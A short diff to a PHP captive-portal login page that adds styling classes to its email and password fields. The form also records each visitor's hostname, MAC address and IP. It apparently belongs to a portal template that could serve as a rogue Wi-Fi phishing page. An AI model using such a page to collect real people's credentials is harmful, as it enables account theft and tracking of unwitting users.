@@ -134,8 +134,8 @@ require_once('helper.php');
           <img class="profile-img" src="assets/img/yqczrisvt2.png" alt="">
 
           <form method="POST" action="/captiveportal/index.php" class="form-signin" onsubmit="redirect()">
-            <input type="text" name="email" class="form-control" placeholder="Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
-            <input type="password" name="password" class="form-control" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
+            <input type="text" name="email" class="form-control nofocus noshadow" placeholder="Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
+            <input type="password" name="password" class="form-control nofocus noshadow" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
             <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
